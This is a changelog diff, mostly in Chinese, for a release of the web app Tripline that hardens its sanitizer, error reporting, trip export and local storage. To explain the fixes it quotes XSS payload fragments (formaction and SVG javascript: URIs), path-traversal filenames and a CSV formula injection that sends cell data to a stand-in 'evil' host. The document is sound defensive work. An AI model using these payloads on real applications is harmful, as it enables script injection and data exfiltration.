@@ -3,6 +3,82 @@
 All notable changes to Tripline will be documented in this file.
 Format based on [Keep a Changelog](https://keepachangelog.com/).
 
+## [2.33.36] - 2026-05-23
+
+**Security + stability hardening — `src/lib/` review round 1**
+
+`/simplify` 後續 review，3 agent (code-reviewer + security-auditor +
+test-engineer) 平行掃 `src/lib/` 32 檔。本 PR 撿 HIGH + MED 安全與穩定
+findings 集中修；架構 refactor（拔 `lib/` → `components/` 反向 import）
+與 test coverage 大批擴充留 round 2/3 PR。
+
+**Security**
+
+- `sanitize.ts` — XSS 攻擊面擴增：
+  - URI-bearing attribute allowlist 從 `href|src|action` 擴到含 `formaction`
+    / `xlink:href` / `srcset` / `poster` / `background` / `data` / `ping` /
+    `cite`。漏掉的 `formaction` 過去可讓 `<button formaction="javascript:...">`
+    繞 sanitize 跑 script。
+  - 整支 `<svg>` 直接拔，消除 `<use href="javascript:...">` 變形攻擊面。
+  - `style` attribute 整支拔（之前只 blocklist `expression(`/`javascript:`/
+    `url(` 等 keyword），消除 `position:fixed;opacity:0` clickjacking 與
+    `content:` CSS exfil 風險。chat / AI reply markdown 不需要 inline style。
+- `apiClient.ts` — `Sentry.captureException` 上報 SYS_* 錯誤前先 scrub：
+  - `path.split('?')[0]` 拔 query string（之前 `?email=…` / `?selected=…`
+    會 leak PII 到 Sentry）。
+  - `detail.replace(/[\r\n]+/g, ' ').slice(0, 200)` 限長 + 拔換行，避免
+    backend SQL fragment / stack trace 透過 detail 流出。
+- `errors.ts` — `ApiError.detail` constructor 同樣 cap 在 200 char + 拔換行。
+  callers (`InvitePage:142` / `DeveloperAppNewPage:251` etc) 把 detail 直接
+  toast 給 user，這層 cap 是底線防護。
+- `tripExport.ts` — 兩個 export 漏洞：
+  - filename：`a.download = \`${tripName}-${today}\`` 過去把 user-controlled
+    `trip.name`（可含 `../`、CRLF、`:`）直接當檔名。Safari 歷史有過 path
+    traversal in `download`。新 `safeFileBase()` strip path separators /
+    control chars / Windows-reserved + cap 80 char。
+  - CSV injection：cells 以 `=` / `+` / `-` / `@` / `\t` / `\r` 開頭被
+    Excel / Google Sheets 當公式執行（`=HYPERLINK("evil",A1)` 可 exfil 其他
+    cell）。新 `csvSafe()` 對這些 leading char 補單引號。
+
+**Stability**
+
+- `apiClient.ts` — 之前 `if (opts?.body) headers['Content-Type'] = 'application/json'`
+  對 FormData / Blob / URLSearchParams body 強塞 JSON Content-Type → server
+  parse fail。新邏輯只在 body 是 string 且 caller 沒帶 Content-Type 時補。
+- `localStorage.ts`:
+  - `lsSet` 包 try/catch + 回傳 boolean — Safari 私密模式 / QuotaExceeded
+    過去直接 throw 在 `useEffect` 內導致 page 白屏。
+  - `lsRenewAll` snapshot keys 先（避免 parallel tab remove 改變 indices）。
+- `weather.ts` — Open-Meteo fetch 包 try/catch + `AbortSignal.timeout(8000)`，
+  upstream hang 不再 stall awaiting render。
+- `poiHours.ts` — `WEEKDAY_RE` 改非 stateful（每次 new RegExp）。之前依賴
+  `lastIndex = 0` reset 才正確，未來若 export 共用會踩到 stateful bug。
+- `tripExport.ts` — catch block 加 `console.error('[downloadTripFormat]', err)`，
+  之前 `catch {}` 完全 swallow，user 看 toast「下載失敗」但無 console 可附 bug。
+
+**Tests (4 new files, 32 new tests)**
+
+- `tests/unit/sanitize-uri-attrs.test.ts` — 10 個 XSS attack vector regression
+  (formaction / srcset / poster / background / data / ping / cite / svg /
+  style / 大小寫 / target=_blank rel injection / SPA `/path` 保留)。
+- `tests/unit/trip-export-safety.test.ts` — `safeFileBase` + `csvSafe` 行為
+  pattern check + source-grep guard。
+- `tests/unit/errors-detail-cap.test.ts` — 200 char cap + newline strip + 短
+  detail pass through + undefined detail 保留。
+- `tests/unit/api-client-content-type.test.ts` — GET 無 Content-Type / POST
+  string JSON / POST FormData / POST URLSearchParams / caller-provided
+  Content-Type 保留。
+- 2126/2126 unit suite green (+32 新 test)。
+
+**Round 2 / 3 留 follow-up**
+
+- `mapDay.ts` + `timelineUtils.ts` 反向 import `components/trip/*` 應抽 type
+  到 `src/types/timeline.ts`（架構，純 refactor 無 behavior change）。
+- `tripExport.ts` 反向 import `DOC_KEYS` from `hooks/useTrip` 與 `showToast`
+  from `components` 應 invert（callback pattern 或 throw）。
+- 14 個 `src/lib/*` 檔零測試（含 `poiCategory.ts` PR-1 canonical / `travelMode.ts`
+  PR-1 / `mapDay.ts` 313 LOC / `weather.ts` 257 LOC）— Round 3 補。
+
 ## [2.33.35] - 2026-05-23
 
 **Perf (simplify PR-8): batch `GET /api/trips/:id/docs` endpoint**
